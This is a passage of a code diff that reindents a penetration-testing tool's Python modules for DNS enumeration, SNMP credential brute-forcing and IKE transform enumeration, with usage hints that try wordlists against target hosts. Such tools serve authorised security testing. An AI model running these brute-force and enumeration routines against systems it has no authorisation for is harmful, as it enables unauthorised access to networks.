-    '_smtp._tcp', '_hkp._tcp', '_hkps._tcp', '_jabber._udp', '_xmpp-server._udp',
-    '_xmpp-client._udp', '_jabber-client._tcp', '_jabber-client._udp',
-    '_adsp._domainkey', '_policy._domainkey', '_domainkey', '_ldap._tcp.dc._msdcs', '_ldap._udp.dc._msdcs']
+    common = [
+        '_gc._tcp', '_kerberos._tcp', '_kerberos._udp', '_ldap._tcp',
+        '_test._tcp', '_sips._tcp', '_sip._udp', '_sip._tcp', '_aix._tcp', '_aix._udp',
+        '_finger._tcp', '_ftp._tcp', '_http._tcp', '_nntp._tcp', '_telnet._tcp',
+        '_whois._tcp', '_h323cs._tcp', '_h323cs._udp', '_h323be._tcp', '_h323be._udp',
+        '_h323ls._tcp', '_h323ls._udp', '_sipinternal._tcp', '_sipinternaltls._tcp',
+        '_sip._tls', '_sipfederationtls._tcp', '_jabber._tcp', '_xmpp-server._tcp', '_xmpp-client._tcp',
+        '_imap.tcp', '_certificates._tcp', '_crls._tcp', '_pgpkeys._tcp', '_pgprevokations._tcp',
+        '_cmp._tcp', '_svcp._tcp', '_crl._tcp', '_ocsp._tcp', '_PKIXREP._tcp',
+        '_smtp._tcp', '_hkp._tcp', '_hkps._tcp', '_jabber._udp', '_xmpp-server._udp',
+        '_xmpp-client._udp', '_jabber-client._tcp', '_jabber-client._udp',
+        '_adsp._domainkey', '_policy._domainkey', '_domainkey', '_ldap._tcp.dc._msdcs', '_ldap._udp.dc._msdcs']
 
-  def distro():
-    import os
-    import re
-    files = ['/usr/share/nmap/nmap-protocols', '/usr/share/nmap/nmap-services', '/etc/protocols', '/etc/services']
-    ret = []
-    for f in files:
-      if not os.path.isfile(f):
-        logger.warn("File '%s' is missing, there will be less records to test" % f)
-        continue
-      for line in open(f):
-        match = re.match(r'([a-zA-Z0-9]+)\s', line)
-        if not match: continue
-        for w in re.split(r'[^a-z0-9]', match.group(1).strip().lower()):
-          ret.extend(['_%s.%s' % (w, i) for i in ('_tcp', '_udp')])
-    return ret
+    def distro():
+        import os
+        import re
+        files = ['/usr/share/nmap/nmap-protocols', '/usr/share/nmap/nmap-services', '/etc/protocols', '/etc/services']
+        ret = []
+        for f in files:
+            if not os.path.isfile(f):
+                logger.warn("File '%s' is missing, there will be less records to test" % f)
+                continue
+            for line in open(f):
+                match = re.match(r'([a-zA-Z0-9]+)\s', line)
+                if not match: continue
+                for w in re.split(r'[^a-z0-9]', match.group(1).strip().lower()):
+                    ret.extend(['_%s.%s' % (w, i) for i in ('_tcp', '_udp')])
+        return ret
 
-  srv = set(common + distro())
-  return srv, len(srv)
+    srv = set(common + distro())
+    return srv, len(srv)
+
 
 class HostInfo:
-  def __init__(self):
-    self.name = set()
-    self.ip = set()
-    self.alias = set()
+    def __init__(self):
+        self.name = set()
+        self.ip = set()
+        self.alias = set()
 
-  def __str__(self):
-    line = ''
-    if self.name:
-      line = ' '.join(self.name)
-    if self.ip:
-      if line: line += ' / '
-      line += ' '.join(map(str, self.ip))
-    if self.alias:
-      if line: line += ' / '
-      line += ' '.join(self.alias)
+    def __str__(self):
+        line = ''
+        if self.name:
+            line = ' '.join(self.name)
+        if self.ip:
+            if line: line += ' / '
+            line += ' '.join(map(str, self.ip))
+        if self.alias:
+            if line: line += ' / '
+            line += ' '.join(self.alias)
 
-    return line
+        return line
+
 
 class Controller_DNS(Controller):
-  records = defaultdict(list)
-  hostmap = defaultdict(HostInfo)
+    records = defaultdict(list)
+    hostmap = defaultdict(HostInfo)
 
-  # show_final {{{
-  def show_final(self):
-    ''' Expected output:
-    Records -----
-          ftp.example.com.   IN A       10.0.1.1
-          www.example.com.   IN A       10.0.1.1
-         prod.example.com.   IN CNAME   www.example.com.
-         ipv6.example.com.   IN AAAA    dead:beef::
-          dev.example.com.   IN A       10.0.1.2
-          svn.example.com.   IN A       10.0.2.1
-      websrv1.example.com.   IN CNAME   prod.example.com.
-         blog.example.com.   IN CNAME   example.wordpress.com.
-    '''
-    print('Records ' + '-'*42)
-    for name, infos in sorted(self.records.items()):
-      for qclass, qtype, rdata in infos:
-        print('%34s %4s %-7s %s' % (name, qclass, qtype, rdata))
+    # show_final {{{
+    def show_final(self):
+        ''' Expected output:
+        Records -----
+              ftp.example.com.   IN A       10.0.1.1
+              www.example.com.   IN A       10.0.1.1
+             prod.example.com.   IN CNAME   www.example.com.
+             ipv6.example.com.   IN AAAA    dead:beef::
+              dev.example.com.   IN A       10.0.1.2
+              svn.example.com.   IN A       10.0.2.1
+          websrv1.example.com.   IN CNAME   prod.example.com.
+             blog.example.com.   IN CNAME   example.wordpress.com.
+        '''
+        print('Records ' + '-' * 42)
+        for name, infos in sorted(self.records.items()):
+            for qclass, qtype, rdata in infos:
+                print('%34s %4s %-7s %s' % (name, qclass, qtype, rdata))
 
-    ''' Expected output:
-    Hostmap ------
-           ipv6.example.com dead:beef::
-            ftp.example.com 10.0.1.1
-            www.example.com 10.0.1.1
-           prod.example.com
-        websrv1.example.com
-            dev.example.com 10.0.1.2
-            svn.example.com 10.0.2.1
-      example.wordpress.com ?
-           blog.example.com
-    Domains ---------------------------
-                example.com 8
-    Networks --------------------------
-                           dead:beef::
-                              10.0.1.x
-                              10.0.2.1
-    '''
-    ipmap = defaultdict(HostInfo)
-    noips = defaultdict(list)
+        ''' Expected output:
+        Hostmap ------
+               ipv6.example.com dead:beef::
+                ftp.example.com 10.0.1.1
+                www.example.com 10.0.1.1
+               prod.example.com
+            websrv1.example.com
+                dev.example.com 10.0.1.2
+                svn.example.com 10.0.2.1
+          example.wordpress.com ?
+               blog.example.com
+        Domains ---------------------------
+                    example.com 8
+        Networks --------------------------
+                               dead:beef::
+                                  10.0.1.x
+                                  10.0.2.1
+        '''
+        ipmap = defaultdict(HostInfo)
+        noips = defaultdict(list)
 
-    '''
-    hostmap = {
-       'www.example.com': {'ip': ['10.0.1.1'], 'alias': ['prod.example.com']},
-       'ftp.example.com': {'ip': ['10.0.1.1'], 'alias': []},
-       'prod.example.com': {'ip': [], 'alias': ['websrv1.example.com']},
-       'ipv6.example.com': {'ip': ['dead:beef::'], 'alias': []},
-       'dev.example.com': {'ip': ['10.0.1.2'], 'alias': []},
-       'example.wordpress.com': {'ip': [], 'alias': ['blog.example.com']},
+        '''
+        hostmap = {
+           'www.example.com': {'ip': ['10.0.1.1'], 'alias': ['prod.example.com']},
+           'ftp.example.com': {'ip': ['10.0.1.1'], 'alias': []},
+           'prod.example.com': {'ip': [], 'alias': ['websrv1.example.com']},
+           'ipv6.example.com': {'ip': ['dead:beef::'], 'alias': []},
+           'dev.example.com': {'ip': ['10.0.1.2'], 'alias': []},
+           'example.wordpress.com': {'ip': [], 'alias': ['blog.example.com']},
 
-    ipmap = {'10.0.1.1': {'name': ['www.example.com', 'ftp.example.com'], 'alias': ['prod.example.com', 'websrv1.example.com']}, ...
-    noips = {'example.wordpress.com': ['blog.example.com'],
-    '''
+        ipmap = {'10.0.1.1': {'name': ['www.example.com', 'ftp.example.com'], 'alias': ['prod.example.com', 'websrv1.example.com']}, ...
+        noips = {'example.wordpress.com': ['blog.example.com'],
+        '''
 
-    for name, hinfo in self.hostmap.items(): 
-      for ip in hinfo.ip:
-        ip = IP(ip)
-        ipmap[ip].name.add(name)
-        ipmap[ip].alias.update(hinfo.alias)
+        for name, hinfo in self.hostmap.items():
+            for ip in hinfo.ip:
+                ip = IP(ip)
+                ipmap[ip].name.add(name)
+                ipmap[ip].alias.update(hinfo.alias)
 
-    for name, hinfo in self.hostmap.items():
-      if not hinfo.ip and hinfo.alias:
-        found = False
-        for ip, v in ipmap.items():
-          if name in v.alias:
+        for name, hinfo in self.hostmap.items():
+            if not hinfo.ip and hinfo.alias:
+                found = False
+                for ip, v in ipmap.items():
+                    if name in v.alias:
+                        for alias in hinfo.alias:
+                            ipmap[ip].alias.add(alias)
+                            found = True
+
+                if not found:  # orphan CNAME hostnames (with no IP address) may be still valid virtual hosts
+                    noips[name].extend(hinfo.alias)
+
+        print('Hostmap ' + '-' * 42)
+        for ip, hinfo in sorted(ipmap.items()):
+            for name in hinfo.name:
+                print('%34s %s' % (name, ip))
             for alias in hinfo.alias:
-              ipmap[ip].alias.add(alias)
-              found = True
+                print('%34s' % alias)
 
-        if not found: # orphan CNAME hostnames (with no IP address) may be still valid virtual hosts
-          noips[name].extend(hinfo.alias)
+        for k, v in noips.items():
+            print('%34s ?' % k)
+            for alias in v:
+                print('%34s' % alias)
 
-    print('Hostmap ' + '-'*42)
-    for ip, hinfo in sorted(ipmap.items()):
-      for name in hinfo.name:
-        print('%34s %s' % (name, ip))
-      for alias in hinfo.alias:
-        print('%34s' % alias)
+        print('Domains ' + '-' * 42)
+        domains = {}
+        for ip, hinfo in ipmap.items():
+            for name in hinfo.name.union(hinfo.alias):
+                if name.count('.') > 1:
+                    i = 1
+                else:
+                    i = 0
+                d = '.'.join(name.split('.')[i:])
+                if d not in domains: domains[d] = 0
+                domains[d] += 1
 
-    for k, v in noips.items():
-      print('%34s ?' % k)
-      for alias in v:
-        print('%34s' % alias)
+        for domain, count in sorted(domains.items(), key=lambda a: a[0].split('.')[-1::-1]):
+            print('%34s %d' % (domain, count))
 
-    print('Domains ' + '-'*42)
-    domains = {}
-    for ip, hinfo in ipmap.items():
-      for name in hinfo.name.union(hinfo.alias):
-        if name.count('.') > 1:
-          i = 1
-        else:
-          i = 0
-        d = '.'.join(name.split('.')[i:])
-        if d not in domains: domains[d] = 0
-        domains[d] += 1
+        print('Networks ' + '-' * 41)
+        nets = {}
+        for ip in set(ipmap):
+            if not ip.version() == 4:
+                nets[ip] = [ip]
+            else:
+                n = ip.make_net('255.255.255.0')
+                if n not in nets: nets[n] = []
+                nets[n].append(ip)
 
-    for domain, count in sorted(domains.items(), key=lambda a:a[0].split('.')[-1::-1]):
-      print('%34s %d' % (domain, count))
+        for net, ips in sorted(nets.items()):
+            if len(ips) == 1:
+                print(' ' * 34 + ' %s' % ips[0])
+            else:
+                print(' ' * 34 + ' %s.x' % '.'.join(str(net).split('.')[:-1]))
 
-    print('Networks ' + '-'*41)
-    nets = {}
-    for ip in set(ipmap):
-      if not ip.version() == 4:
-        nets[ip] = [ip]
-      else:
-        n = ip.make_net('255.255.255.0')
-        if n not in nets: nets[n] = []
-        nets[n].append(ip)
+    # }}}
 
-    for net, ips in sorted(nets.items()):
-      if len(ips) == 1:
-        print(' '*34 + ' %s' % ips[0])
-      else:
-        print(' '*34 + ' %s.x' % '.'.join(str(net).split('.')[:-1]))
+    def push_final(self, resp):
+        if hasattr(resp, 'rrs'):
+            for rr in resp.rrs:
+                name, qclass, qtype, data = rr
 
-  # }}}
+                info = (qclass, qtype, data)
+                if info not in self.records[name]:
+                    self.records[name].append(info)
 
-  def push_final(self, resp):
-    if hasattr(resp, 'rrs'):
-      for rr in resp.rrs:
-        name, qclass, qtype, data = rr
+                if not qclass == 'IN':
+                    continue
 
-        info = (qclass, qtype, data)
-        if info not in self.records[name]:
-          self.records[name].append(info)
+                if qtype == 'PTR':
+                    data = data[:-1]
+                    self.hostmap[data].ip.add(name)
 
-        if not qclass == 'IN':
-          continue
+                else:
+                    if qtype in ('A', 'AAAA'):
+                        name = name[:-1]
+                        self.hostmap[name].ip.add(data)
 
-        if qtype == 'PTR':
-          data = data[:-1]
-          self.hostmap[data].ip.add(name)
-
-        else:
-          if qtype in ('A', 'AAAA'):
-            name = name[:-1]
-            self.hostmap[name].ip.add(data)
-
-          elif qtype == 'CNAME':
-            name, data = name[:-1], data[:-1]
-            self.hostmap[data].alias.add(name)
+                    elif qtype == 'CNAME':
+                        name, data = name[:-1], data[:-1]
+                        self.hostmap[data].alias.add(name)
 
 
 class DNS_reverse:
-  '''Reverse DNS lookup'''
+    '''Reverse DNS lookup'''
 
-  usage_hints = [
-    """%prog host=NET0 0=192.168.0.0/24 -x ignore:code=3""",
-    """%prog host=NET0 0=216.239.32.0-216.239.47.255,8.8.8.0/24 -x ignore:code=3 -x ignore:fgrep!=google.com -x ignore:fgrep=216-239-""",
+    usage_hints = [
+        """%prog host=NET0 0=192.168.0.0/24 -x ignore:code=3""",
+        """%prog host=NET0 0=216.239.32.0-216.239.47.255,8.8.8.0/24 -x ignore:code=3 -x ignore:fgrep!=google.com -x ignore:fgrep=216-239-""",
     ]
 
-  available_options = (
-    ('host', 'IP addresses to reverse lookup'),
-    ('server', 'name server to query (directly asking a zone authoritative NS may return more results) [8.8.8.8]'),
-    ('timeout', 'seconds to wait for a response [5]'),
-    ('protocol', 'send queries over udp or tcp [udp]'),
+    available_options = (
+        ('host', 'IP addresses to reverse lookup'),
+        ('server', 'name server to query (directly asking a zone authoritative NS may return more results) [8.8.8.8]'),
+        ('timeout', 'seconds to wait for a response [5]'),
+        ('protocol', 'send queries over udp or tcp [udp]'),
     )
-  available_actions = ()
+    available_actions = ()
 
-  Response = Response_Base
+    Response = Response_Base
 
-  def execute(self, host, server='8.8.8.8', timeout='5', protocol='udp'):
+    def execute(self, host, server='8.8.8.8', timeout='5', protocol='udp'):
+        with Timing() as timing:
+            response = dns_query(server, int(timeout), protocol, dns.reversename.from_address(host), qtype='PTR',
+                                 qclass='IN')
 
-    with Timing() as timing:
-      response = dns_query(server, int(timeout), protocol, dns.reversename.from_address(host), qtype='PTR', qclass='IN')
+        code = response.rcode()
+        status = dns.rcode.to_text(code)
+        rrs = [[host, c, t, d] for _, _, c, t, d in [rr.to_text().split(' ', 4) for rr in response.answer]]
 
-    code = response.rcode()
-    status = dns.rcode.to_text(code)
-    rrs = [[host, c, t, d] for _, _, c, t, d in [rr.to_text().split(' ', 4) for rr in response.answer]]
+        mesg = '%s %s' % (status, ''.join('[%s]' % ' '.join(rr) for rr in rrs))
+        resp = self.Response(code, mesg, timing)
 
-    mesg = '%s %s' % (status, ''.join('[%s]' % ' '.join(rr) for rr in rrs))
-    resp = self.Response(code, mesg, timing)
+        resp.rrs = rrs
 
-    resp.rrs = rrs
+        return resp
 
-    return resp
 
 class DNS_forward:
-  '''Forward DNS lookup'''
+    '''Forward DNS lookup'''
 
-  usage_hints = [
-    """%prog name=FILE0.google.com 0=names.txt -x ignore:code=3""",
-    """%prog name=google.MOD0 0=TLD -x ignore:code=3""",
-    """%prog name=MOD0.microsoft.com 0=SRV qtype=SRV -x ignore:code=3""",
+    usage_hints = [
+        """%prog name=FILE0.google.com 0=names.txt -x ignore:code=3""",
+        """%prog name=google.MOD0 0=TLD -x ignore:code=3""",
+        """%prog name=MOD0.microsoft.com 0=SRV qtype=SRV -x ignore:code=3""",
     ]
 
-  available_options = (
-    ('name', 'domain names to lookup'),
-    ('server', 'name server to query (directly asking the zone authoritative NS may return more results) [8.8.8.8]'),
-    ('timeout', 'seconds to wait for a response [5]'),
-    ('protocol', 'send queries over udp or tcp [udp]'),
-    ('qtype', 'type to query [ANY]'),
-    ('qclass', 'class to query [IN]'),
+    available_options = (
+        ('name', 'domain names to lookup'),
+        (
+            'server',
+            'name server to query (directly asking the zone authoritative NS may return more results) [8.8.8.8]'),
+        ('timeout', 'seconds to wait for a response [5]'),
+        ('protocol', 'send queries over udp or tcp [udp]'),
+        ('qtype', 'type to query [ANY]'),
+        ('qclass', 'class to query [IN]'),
     )
-  available_actions = ()
+    available_actions = ()
 
-  available_keys = {
-    'TLD': generate_tld,
-    'SRV': generate_srv,
+    available_keys = {
+        'TLD': generate_tld,
+        'SRV': generate_srv,
     }
 
-  Response = Response_Base  
+    Response = Response_Base
 
-  def execute(self, name, server='8.8.8.8', timeout='5', protocol='udp', qtype='ANY', qclass='IN'):
+    def execute(self, name, server='8.8.8.8', timeout='5', protocol='udp', qtype='ANY', qclass='IN'):
+        with Timing() as timing:
+            response = dns_query(server, int(timeout), protocol, name, qtype=qtype, qclass=qclass)
 
-    with Timing() as timing:
-      response = dns_query(server, int(timeout), protocol, name, qtype=qtype, qclass=qclass)
+        code = response.rcode()
+        status = dns.rcode.to_text(code)
+        rrs = [[n, c, t, d] for n, _, c, t, d in
+               [rr.to_text().split(' ', 4) for rr in response.answer + response.additional + response.authority]]
 
-    code = response.rcode()
-    status = dns.rcode.to_text(code)
-    rrs = [[n, c, t, d] for n, _, c, t, d in [rr.to_text().split(' ', 4) for rr in response.answer + response.additional + response.authority]]
+        mesg = '%s %s' % (status, ''.join('[%s]' % ' '.join(rr) for rr in rrs))
+        resp = self.Response(code, mesg, timing)
 
-    mesg = '%s %s' % (status, ''.join('[%s]' % ' '.join(rr) for rr in rrs))
-    resp = self.Response(code, mesg, timing)
+        resp.rrs = rrs
 
-    resp.rrs = rrs
+        return resp
 
-    return resp
 
 # }}}
 
 # SNMP {{{
 try:
-  from pysnmp.entity.rfc3413.oneliner import cmdgen
+    from pysnmp.entity.rfc3413.oneliner import cmdgen
 except ImportError:
-  notfound.append('pysnmp')
+    notfound.append('pysnmp')
+
 
 class SNMP_login:
-  '''Brute-force SNMP v1/2/3'''
+    '''Brute-force SNMP v1/2/3'''
 
-  usage_hints = (
-    """%prog host=10.0.0.1 version=2 community=FILE0 0=names.txt -x ignore:mesg='No SNMP response received before timeout'""",
-    """%prog host=10.0.0.1 version=3 user=FILE0 0=logins.txt -x ignore:mesg=unknownUserName""",
-    """%prog host=10.0.0.1 version=3 user=myuser auth_key=FILE0 0=passwords.txt -x ignore:mesg=wrongDigest""",
+    usage_hints = (
+        """%prog host=10.0.0.1 version=2 community=FILE0 0=names.txt -x ignore:mesg='No SNMP response received before timeout'""",
+        """%prog host=10.0.0.1 version=3 user=FILE0 0=logins.txt -x ignore:mesg=unknownUserName""",
+        """%prog host=10.0.0.1 version=3 user=myuser auth_key=FILE0 0=passwords.txt -x ignore:mesg=wrongDigest""",
     )
-  
-  available_options = (
-    ('host', 'target host'),
-    ('port', 'target port [161]'),
-    ('version', 'SNMP version to use [2|3|1]'),
-    #('security_name', 'SNMP v1/v2 username, for most purposes it can be any arbitrary string [test-agent]'),
-    ('community', 'SNMPv1/2c community names to test [public]'),
-    ('user', 'SNMPv3 usernames to test [myuser]'),
-    ('auth_key', 'SNMPv3 pass-phrases to test [my_password]'),
-    #('priv_key', 'SNMP v3 secret key for encryption'), # see http://pysnmp.sourceforge.net/docs/4.x/index.html#UsmUserData
-    #('auth_protocol', ''),
-    #('priv_protocol', ''),
-    ('timeout', 'seconds to wait for a response [1]'),
-    ('retries', 'number of successive request retries [2]'),
+
+    available_options = (
+        ('host', 'target host'),
+        ('port', 'target port [161]'),
+        ('version', 'SNMP version to use [2|3|1]'),
+        # ('security_name', 'SNMP v1/v2 username, for most purposes it can be any arbitrary string [test-agent]'),
+        ('community', 'SNMPv1/2c community names to test [public]'),
+        ('user', 'SNMPv3 usernames to test [myuser]'),
+        ('auth_key', 'SNMPv3 pass-phrases to test [my_password]'),
+        # ('priv_key', 'SNMP v3 secret key for encryption'), # see http://pysnmp.sourceforge.net/docs/4.x/index.html#UsmUserData
+        # ('auth_protocol', ''),
+        # ('priv_protocol', ''),
+        ('timeout', 'seconds to wait for a response [1]'),
+        ('retries', 'number of successive request retries [2]'),
     )
-  available_actions = ()
+    available_actions = ()
 
-  Response = Response_Base
+    Response = Response_Base
 
-  def execute(self, host, port=None, version='2', community='public', user='myuser', auth_key='my_password', timeout='1', retries='2'):
-    if version in ('1', '2'):
-      security_model = cmdgen.CommunityData('test-agent', community, 0 if version == '1' else 1)
+    def execute(self, host, port=None, version='2', community='public', user='myuser', auth_key='my_password',
+                timeout='1', retries='2'):
+        if version in ('1', '2'):
+            security_model = cmdgen.CommunityData('test-agent', community, 0 if version == '1' else 1)
 
-    elif version == '3':
-      security_model = cmdgen.UsmUserData(user, auth_key) # , priv_key)
-      if len(auth_key) < 8:
-        return self.Response('1', 'SNMPv3 requires passphrases to be at least 8 characters long')
+        elif version == '3':
+            security_model = cmdgen.UsmUserData(user, auth_key)  # , priv_key)
+            if len(auth_key) < 8:
+                return self.Response('1', 'SNMPv3 requires passphrases to be at least 8 characters long')
 
-    else:
-      raise NotImplementedError("Incorrect SNMP version '%s'" % version)
+        else:
+            raise NotImplementedError("Incorrect SNMP version '%s'" % version)
 
-    with Timing() as timing:
-      errorIndication, errorStatus, errorIndex, varBinds = cmdgen.CommandGenerator().getCmd(
-        security_model,
-        cmdgen.UdpTransportTarget((host, int(port or 161)), timeout=int(timeout), retries=int(retries)),
-        (1,3,6,1,2,1,1,1,0)
-        )
+        with Timing() as timing:
+            errorIndication, errorStatus, errorIndex, varBinds = cmdgen.CommandGenerator().getCmd(
+                security_model,
+                cmdgen.UdpTransportTarget((host, int(port or 161)), timeout=int(timeout), retries=int(retries)),
+                (1, 3, 6, 1, 2, 1, 1, 1, 0)
+            )
 
-    code = '%d-%d' % (errorStatus, errorIndex)
-    if not errorIndication:
-      mesg = '%s' % varBinds
-    else:
-      mesg = '%s' % errorIndication 
+        code = '%d-%d' % (errorStatus, errorIndex)
+        if not errorIndication:
+            mesg = '%s' % varBinds
+        else:
+            mesg = '%s' % errorIndication
 
-    return self.Response(code, mesg, timing)
+        return self.Response(code, mesg, timing)
+
 
 # }}}
 
 # IKE {{{
 if not which('ike-scan'):
-  notfound.append('ike-scan')
+    notfound.append('ike-scan')
 
 # http://www.iana.org/assignments/ipsec-registry/ipsec-registry.xhtml
-IKE_ENC   = [('1', 'DES'), ('2', 'IDEA'), ('3', 'BLOWFISH'), ('4', 'RC5'), ('5', '3DES'), ('6', 'CAST'), ('7/128', 'AES128'), ('7/192', 'AES192'), ('7/256', 'AES256'), ('8', 'Camellia')]
-IKE_HASH  = [('1', 'MD5'), ('2', 'SHA1'), ('3', 'Tiger'), ('4', 'SHA2-256'), ('5', 'SHA2-384'), ('6', 'SHA2-512')]
-IKE_AUTH  = [('1', 'PSK'), ('2', 'DSS Sig'), ('3', 'RSA Sig'), ('4', 'RSA Enc'), ('5', 'Revised RSA Enc'),
-            #('6', 'EIGAMEL Enc'), ('7', 'Revised EIGAMEL Enc'), ('8', 'ECDSA Sig'), # Reserved
-            #('9', 'ECDSA SHA-256'), ('10', 'ECDSA SHA-384'), ('11', 'ECDSA SHA-512'), # RFC4754
-             ('65001', 'XAUTH'), ('64221', 'Hybrid'), ('64222', 'Hybrid 64222')] #, ('64223', 'Hybrid 64223'), ... ('65002', 'Hybrid 65002') ...
+IKE_ENC = [('1', 'DES'), ('2', 'IDEA'), ('3', 'BLOWFISH'), ('4', 'RC5'), ('5', '3DES'), ('6', 'CAST'),
+           ('7/128', 'AES128'), ('7/192', 'AES192'), ('7/256', 'AES256'), ('8', 'Camellia')]
+IKE_HASH = [('1', 'MD5'), ('2', 'SHA1'), ('3', 'Tiger'), ('4', 'SHA2-256'), ('5', 'SHA2-384'), ('6', 'SHA2-512')]
+IKE_AUTH = [('1', 'PSK'), ('2', 'DSS Sig'), ('3', 'RSA Sig'), ('4', 'RSA Enc'), ('5', 'Revised RSA Enc'),
+            # ('6', 'EIGAMEL Enc'), ('7', 'Revised EIGAMEL Enc'), ('8', 'ECDSA Sig'), # Reserved
+            # ('9', 'ECDSA SHA-256'), ('10', 'ECDSA SHA-384'), ('11', 'ECDSA SHA-512'), # RFC4754
+            ('65001', 'XAUTH'), ('64221', 'Hybrid'),
+            ('64222', 'Hybrid 64222')]  # , ('64223', 'Hybrid 64223'), ... ('65002', 'Hybrid 65002') ...
 IKE_GROUP = [('1', 'modp768'), ('2', 'modp1024'), ('5', 'modp1536'),
-            #('3', 'ecc3'), ('4', 'ecc4'), # any implementations?
-            # '6', '7', '8', '9', '10', '11', '12', '13', # only in draft, not RFC
-             ('14', 'modp2048')] #, ('15', 'modp3072'), ('16', 'modp4096'), ('17', 'modp6144'), ('18', 'modp8192')] # RFC3526
-            # '19', '20', '21', '22', '23', '24', '25', '26', # RFC5903
-            # '27', '28', '29', '30', # RFC6932
+             # ('3', 'ecc3'), ('4', 'ecc4'), # any implementations?
+             # '6', '7', '8', '9', '10', '11', '12', '13', # only in draft, not RFC
+             ('14',
+              'modp2048')]  # , ('15', 'modp3072'), ('16', 'modp4096'), ('17', 'modp6144'), ('18', 'modp8192')] # RFC3526
+
+
+# '19', '20', '21', '22', '23', '24', '25', '26', # RFC5903
+# '27', '28', '29', '30', # RFC6932
 
 def generate_transforms():
-  lists = map(lambda l: [i[0] for i in l], [IKE_ENC, IKE_HASH, IKE_AUTH, IKE_GROUP])
-  return map(lambda p: ','.join(p), product(*[chain(l) for l in lists])), reduce(lambda x,y: x*y, map(len, lists))
+    lists = map(lambda l: [i[0] for i in l], [IKE_ENC, IKE_HASH, IKE_AUTH, IKE_GROUP])
+    return map(lambda p: ','.join(p), product(*[chain(l) for l in lists])), reduce(lambda x, y: x * y, map(len, lists))
+
 
 class Controller_IKE(Controller):
+    results = defaultdict(list)
 
-  results = defaultdict(list)
+    def show_final(self):
+        ''' Expected output:
+    + 10.0.0.1:500 (Main Mode)
+        Encryption       Hash         Auth      Group
+        ---------- ----------   ---------- ----------
+              3DES        MD5          PSK   modp1024
+              3DES        MD5        XAUTH   modp1024
+            AES128       SHA1          PSK   modp1024
+            AES128       SHA1        XAUTH   modp1024
 
-  def show_final(self):
-    ''' Expected output:
-+ 10.0.0.1:500 (Main Mode)
-    Encryption       Hash         Auth      Group
-    ---------- ----------   ---------- ----------
-          3DES        MD5          PSK   modp1024
-          3DES        MD5        XAUTH   modp1024
-        AES128       SHA1          PSK   modp1024
-        AES128       SHA1        XAUTH   modp1024
+    + 10.0.0.1:500 (Aggressive Mode)
+        Encryption       Hash         Auth      Group
+        ---------- ----------   ---------- ----------
+              3DES        MD5          PSK   modp1024
+              3DES        MD5        XAUTH   modp1024
+            AES128       SHA1          PSK   modp1024
+            AES128       SHA1        XAUTH   modp1024
+        '''
 
-+ 10.0.0.1:500 (Aggressive Mode)
-    Encryption       Hash         Auth      Group
-    ---------- ----------   ---------- ----------
-          3DES        MD5          PSK   modp1024
-          3DES        MD5        XAUTH   modp1024
-        AES128       SHA1          PSK   modp1024
-        AES128       SHA1        XAUTH   modp1024
-    '''
+        ike_enc = dict(IKE_ENC)
+        ike_hsh = dict(IKE_HASH)
+        ike_ath = dict(IKE_AUTH)
+        ike_grp = dict(IKE_GROUP)
 
-    ike_enc = dict(IKE_ENC)
-    ike_hsh = dict(IKE_HASH)
-    ike_ath = dict(IKE_AUTH)
-    ike_grp = dict(IKE_GROUP)
+        for endpoint, transforms in self.results.iteritems():
+            print('\n+ %s' % endpoint)
+            print('    %10s %10s %12s %10s' % ('Encryption', 'Hash', 'Auth', 'Group'))
+            print('    %10s %10s %12s %10s' % ('-' * 10, '-' * 10, '-' * 10, '-' * 10))
+            for transform in transforms:
+                e, h, a, g = transform.split(',')
+                enc = ike_enc[e]
+                hsh = ike_hsh[h]
+                ath = ike_ath[a]
+                grp = ike_grp[g]
+                print('    %10s %10s %12s %10s' % (enc, hsh, ath, grp))
 
-    for endpoint, transforms in self.results.iteritems():
-      print('\n+ %s' % endpoint)
-      print('    %10s %10s %12s %10s' % ('Encryption', 'Hash', 'Auth', 'Group'))
-      print('    %10s %10s %12s %10s' % ('-'*10, '-'*10, '-'*10, '-'*10))
-      for transform in transforms:
-        e, h, a, g = transform.split(',')
-        enc = ike_enc[e]
-        hsh = ike_hsh[h]
-        ath = ike_ath[a]
-        grp = ike_grp[g]
-        print('    %10s %10s %12s %10s' % (enc, hsh, ath, grp))
+    def push_final(self, resp):
+        if hasattr(resp, 'rrs'):
+            endpoint, transform = resp.rrs
+            self.results[endpoint].append(transform)
 
-  def push_final(self, resp):
-    if hasattr(resp, 'rrs'):
-      endpoint, transform = resp.rrs
-      self.results[endpoint].append(transform)
 
 class IKE_enum:
-  '''Enumerate IKE transforms'''
+    '''Enumerate IKE transforms'''
 
-  usage_hints = [
-    """%prog host=10.0.0.1 transform=MOD0 0=TRANS -x ignore:fgrep=NO-PROPOSAL""",
-    """%prog host=10.0.0.1 transform=MOD0 0=TRANS -x ignore:fgrep=NO-PROPOSAL aggressive=RANGE1 1=int:0-1""",
+    usage_hints = [
+        """%prog host=10.0.0.1 transform=MOD0 0=TRANS -x ignore:fgrep=NO-PROPOSAL""",
+        """%prog host=10.0.0.1 transform=MOD0 0=TRANS -x ignore:fgrep=NO-PROPOSAL aggressive=RANGE1 1=int:0-1""",
     ]
 
-  available_options = (
-    ('host', 'target host'),
-    ('host', 'target port [500]'),
-    ('transform', 'transform to test [5,1,1,2]'),
-    ('aggressive', 'use aggressive mode [0|1]'),
-    ('groupname', 'identification value for aggressive mode [foo]'),
-    ('vid', 'comma-separated vendor IDs to use'),
+    available_options = (
+        ('host', 'target host'),
+        ('host', 'target port [500]'),
+        ('transform', 'transform to test [5,1,1,2]'),
+        ('aggressive', 'use aggressive mode [0|1]'),
+        ('groupname', 'identification value for aggressive mode [foo]'),
+        ('vid', 'comma-separated vendor IDs to use'),
     )
-  available_actions = ()
+    available_actions = ()
 
-  available_keys = {
-    'TRANS': generate_transforms,
+    available_keys = {
+        'TRANS': generate_transforms,
     }
 
-  Response = Response_Base
+    Response = Response_Base
 
-  def __init__(self):
-    uid = multiprocessing.current_process().name[9:]
-    self.sport = '51%s' % uid
+    def __init__(self):
+        uid = multiprocessing.current_process().name[9:]
+        self.sport = '51%s' % uid
 
-  def execute(self, host, port='500', transform='5,1,1,2', aggressive='0', groupname='foo', vid=''):
+    def execute(self, host, port='500', transform='5,1,1,2', aggressive='0', groupname='foo', vid=''):
 
-    cmd = ['ike-scan', '-M', '--sport', self.sport, host, '--dport', port, '--trans', transform]
-    if aggressive == '1':
-      cmd.append('-A')
-      if groupname:
-        cmd.extend(['--id', groupname])
-    for v in vid.split(','):
-      cmd.extend(['--vendor', v])
+        cmd = ['ike-scan', '-M', '--sport', self.sport, host, '--dport', port, '--trans', transform]
+        if aggressive == '1':
+            cmd.append('-A')
